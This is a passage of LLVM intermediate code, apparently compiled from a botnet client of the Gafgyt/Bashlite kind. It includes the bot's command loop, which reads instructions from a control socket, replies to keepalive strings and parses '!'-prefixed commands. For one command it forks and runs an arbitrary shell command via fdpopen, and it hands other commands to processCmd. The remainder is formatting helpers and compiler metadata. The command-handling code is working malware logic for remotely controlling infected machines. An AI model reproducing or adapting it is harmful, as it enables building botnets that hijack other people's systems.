  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %14, align 4
  %116 = sub i32 %115, 1
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %114, i64 %117
  store i32 %113, i32* %118, align 4
  br label %119

119:                                              ; preds = %108
  %120 = load i32, i32* %14, align 4
  %121 = add i32 %120, 1
  store i32 %121, i32* %14, align 4
  br label %103, !llvm.loop !61

122:                                              ; preds = %103
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 0, i32* %127, align 4
  %128 = load i64, i64* @numpids, align 8
  %129 = add i64 %128, -1
  store i64 %129, i64* @numpids, align 8
  %130 = load i64, i64* @numpids, align 8
  %131 = add i64 %130, 1
  %132 = mul i64 %131, 4
  %133 = call noalias align 16 i8* @malloc(i64 %132) #12
  %134 = bitcast i8* %133 to i32*
  store i32* %134, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %135

135:                                              ; preds = %150, %122
  %136 = load i32, i32* %14, align 4
  %137 = zext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %153

140:                                              ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %14, align 4
  %143 = zext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = load i32*, i32** %13, align 8
  %147 = load i32, i32* %14, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  store i32 %145, i32* %149, align 4
  br label %150

150:                                              ; preds = %140
  %151 = load i32, i32* %14, align 4
  %152 = add i32 %151, 1
  store i32 %152, i32* %14, align 4
  br label %135, !llvm.loop !62

153:                                              ; preds = %135
  %154 = load i32*, i32** @pids, align 8
  %155 = bitcast i32* %154 to i8*
  call void @free(i8* %155) #12
  %156 = load i32*, i32** %13, align 8
  store i32* %156, i32** @pids, align 8
  br label %157

157:                                              ; preds = %153, %92
  br label %158

158:                                              ; preds = %157
  %159 = load i32, i32* %12, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %12, align 4
  br label %87, !llvm.loop !63

161:                                              ; preds = %87
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %163
  store i8 0, i8* %164, align 1
  %165 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  call void @trim(i8* %165)
  %166 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %167 = call i8* @strstr(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #11
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %169 = icmp eq i8* %167, %168
  br i1 %169, label %170, label %173

170:                                              ; preds = %161
  %171 = load i32, i32* @mainCommSock, align 4
  %172 = call i32 (i32, i8*, ...) @sockprintf(i32 %171, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i64 0, i64 0))
  br label %81, !llvm.loop !64

173:                                              ; preds = %161
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %175 = call i8* @strstr(i8* %174, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i64 0, i64 0)) #11
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %177 = icmp eq i8* %175, %176
  br i1 %177, label %178, label %179

178:                                              ; preds = %173
  call void @exit(i32 0) #16
  unreachable

179:                                              ; preds = %173
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  store i8* %180, i8** %15, align 8
  %181 = load i8*, i8** %15, align 8
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 33
  br i1 %184, label %185, label %364

185:                                              ; preds = %179
  %186 = load i8*, i8** %15, align 8
  %187 = getelementptr inbounds i8, i8* %186, i64 1
  store i8* %187, i8** %16, align 8
  br label %188

188:                                              ; preds = %200, %185
  %189 = load i8*, i8** %16, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp ne i32 %191, 32
  br i1 %192, label %193, label %198

193:                                              ; preds = %188
  %194 = load i8*, i8** %16, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp ne i32 %196, 0
  br label %198

198:                                              ; preds = %193, %188
  %199 = phi i1 [ false, %188 ], [ %197, %193 ]
  br i1 %199, label %200, label %203

200:                                              ; preds = %198
  %201 = load i8*, i8** %16, align 8
  %202 = getelementptr inbounds i8, i8* %201, i32 1
  store i8* %202, i8** %16, align 8
  br label %188, !llvm.loop !65

203:                                              ; preds = %198
  %204 = load i8*, i8** %16, align 8
  %205 = load i8, i8* %204, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %209

208:                                              ; preds = %203
  br label %81, !llvm.loop !64

209:                                              ; preds = %203
  %210 = load i8*, i8** %16, align 8
  store i8 0, i8* %210, align 1
  %211 = load i8*, i8** %15, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 1
  store i8* %212, i8** %16, align 8
  %213 = load i8*, i8** %15, align 8
  %214 = load i8*, i8** %16, align 8
  %215 = call i64 @strlen(i8* %214) #11
  %216 = getelementptr inbounds i8, i8* %213, i64 %215
  %217 = getelementptr inbounds i8, i8* %216, i64 2
  store i8* %217, i8** %15, align 8
  br label %218

218:                                              ; preds = %238, %209
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %15, align 8
  %221 = call i64 @strlen(i8* %220) #11
  %222 = sub i64 %221, 1
  %223 = getelementptr inbounds i8, i8* %219, i64 %222
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 10
  br i1 %226, label %236, label %227

227:                                              ; preds = %218
  %228 = load i8*, i8** %15, align 8
  %229 = load i8*, i8** %15, align 8
  %230 = call i64 @strlen(i8* %229) #11
  %231 = sub i64 %230, 1
  %232 = getelementptr inbounds i8, i8* %228, i64 %231
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 13
  br label %236

236:                                              ; preds = %227, %218
  %237 = phi i1 [ true, %218 ], [ %235, %227 ]
  br i1 %237, label %238, label %244

238:                                              ; preds = %236
  %239 = load i8*, i8** %15, align 8
  %240 = load i8*, i8** %15, align 8
  %241 = call i64 @strlen(i8* %240) #11
  %242 = sub i64 %241, 1
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  store i8 0, i8* %243, align 1
  br label %218, !llvm.loop !66

244:                                              ; preds = %236
  %245 = load i8*, i8** %15, align 8
  store i8* %245, i8** %17, align 8
  br label %246

246:                                              ; preds = %258, %244
  %247 = load i8*, i8** %15, align 8
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp ne i32 %249, 32
  br i1 %250, label %251, label %256

251:                                              ; preds = %246
  %252 = load i8*, i8** %15, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp ne i32 %254, 0
  br label %256

256:                                              ; preds = %251, %246
  %257 = phi i1 [ false, %246 ], [ %255, %251 ]
  br i1 %257, label %258, label %261

258:                                              ; preds = %256
  %259 = load i8*, i8** %15, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %15, align 8
  br label %246, !llvm.loop !67

261:                                              ; preds = %256
  %262 = load i8*, i8** %15, align 8
  store i8 0, i8* %262, align 1
  %263 = load i8*, i8** %15, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %15, align 8
  %265 = load i8*, i8** %17, align 8
  store i8* %265, i8** %18, align 8
  br label %266

266:                                              ; preds = %270, %261
  %267 = load i8*, i8** %18, align 8
  %268 = load i8, i8* %267, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %279

270:                                              ; preds = %266
  %271 = load i8*, i8** %18, align 8
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i32
  %274 = call i32 @toupper(i32 %273) #11
  %275 = trunc i32 %274 to i8
  %276 = load i8*, i8** %18, align 8
  store i8 %275, i8* %276, align 1
  %277 = load i8*, i8** %18, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %18, align 8
  br label %266, !llvm.loop !68

279:                                              ; preds = %266
  %280 = load i8*, i8** %17, align 8
  %281 = call i32 @strcmp(i8* %280, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i64 0, i64 0)) #11
  %282 = icmp eq i32 %281, 0
  br i1 %282, label %283, label %306

283:                                              ; preds = %279
  %284 = call i32 @listFork()
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %286, label %287

286:                                              ; preds = %283
  br label %81, !llvm.loop !64

287:                                              ; preds = %283
  %288 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %288, i8 0, i64 1024, i1 false)
  %289 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %290 = load i8*, i8** %15, align 8
  %291 = call i32 (i8*, i8*, ...) @szprintf(i8* %289, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i64 0, i64 0), i8* %290)
  %292 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %293 = call i32 @fdpopen(i8* %292, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i64 0, i64 0))
  store i32 %293, i32* %20, align 4
  br label %294

294:                                              ; preds = %299, %287
  %295 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %296 = load i32, i32* %20, align 4
  %297 = call i8* @fdgets(i8* %295, i32 1024, i32 %296)
  %298 = icmp ne i8* %297, null
  br i1 %298, label %299, label %303

299:                                              ; preds = %294
  %300 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @trim(i8* %300)
  %301 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %301, i8 0, i64 1024, i1 false)
  %302 = call i32 @sleep(i32 1)
  br label %294, !llvm.loop !69

303:                                              ; preds = %294
  %304 = load i32, i32* %20, align 4
  %305 = call i32 @fdpclose(i32 %304)
  call void @exit(i32 0) #16
  unreachable

306:                                              ; preds = %279
  store i32 1, i32* %22, align 4
  %307 = load i8*, i8** %15, align 8
  %308 = call i8* @strtok(i8* %307, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #12
  store i8* %308, i8** %23, align 8
  %309 = load i8*, i8** %17, align 8
  %310 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %309, i8** %310, align 16
  br label %311

311:                                              ; preds = %342, %306
  %312 = load i8*, i8** %23, align 8
  %313 = icmp ne i8* %312, null
  br i1 %313, label %314, label %344

314:                                              ; preds = %311
  %315 = load i8*, i8** %23, align 8
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp ne i32 %317, 10
  br i1 %318, label %319, label %342

319:                                              ; preds = %314
  %320 = load i8*, i8** %23, align 8
  %321 = call i64 @strlen(i8* %320) #11
  %322 = add i64 %321, 1
  %323 = call noalias align 16 i8* @malloc(i64 %322) #12
  %324 = load i32, i32* %22, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %325
  store i8* %323, i8** %326, align 8
  %327 = load i32, i32* %22, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %328
  %330 = load i8*, i8** %329, align 8
  %331 = load i8*, i8** %23, align 8
  %332 = call i64 @strlen(i8* %331) #11
  %333 = add i64 %332, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %330, i8 0, i64 %333, i1 false)
  %334 = load i32, i32* %22, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %335
  %337 = load i8*, i8** %336, align 8
  %338 = load i8*, i8** %23, align 8
  %339 = call i8* @strcpy(i8* %337, i8* %338) #12
  %340 = load i32, i32* %22, align 4
  %341 = add nsw i32 %340, 1
  store i32 %341, i32* %22, align 4
  br label %342

342:                                              ; preds = %319, %314
  %343 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #12
  store i8* %343, i8** %23, align 8
  br label %311, !llvm.loop !70

344:                                              ; preds = %311
  %345 = load i32, i32* %22, align 4
  %346 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  call void @processCmd(i32 %345, i8** %346)
  %347 = load i32, i32* %22, align 4
  %348 = icmp sgt i32 %347, 1
  br i1 %348, label %349, label %363

349:                                              ; preds = %344
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %350

350:                                              ; preds = %359, %349
  %351 = load i32, i32* %24, align 4
  %352 = load i32, i32* %22, align 4
  %353 = icmp slt i32 %351, %352
  br i1 %353, label %354, label %362

354:                                              ; preds = %350
  %355 = load i32, i32* %24, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %356
  %358 = load i8*, i8** %357, align 8
  call void @free(i8* %358) #12
  br label %359

359:                                              ; preds = %354
  %360 = load i32, i32* %24, align 4
  %361 = add nsw i32 %360, 1
  store i32 %361, i32* %24, align 4
  br label %350, !llvm.loop !71

362:                                              ; preds = %350
  br label %363

363:                                              ; preds = %362, %344
  br label %364

364:                                              ; preds = %363, %179
  br label %81, !llvm.loop !64

365:                                              ; preds = %81
  br label %72
}

declare i32 @printf(i8*, ...) #5

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #5

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @prints(i8** %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !72

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !73

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !74

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !75

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @printi(i8** %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !76

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @printchar(i8** %0, i32 %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
!68 = distinct !{!68, !7}
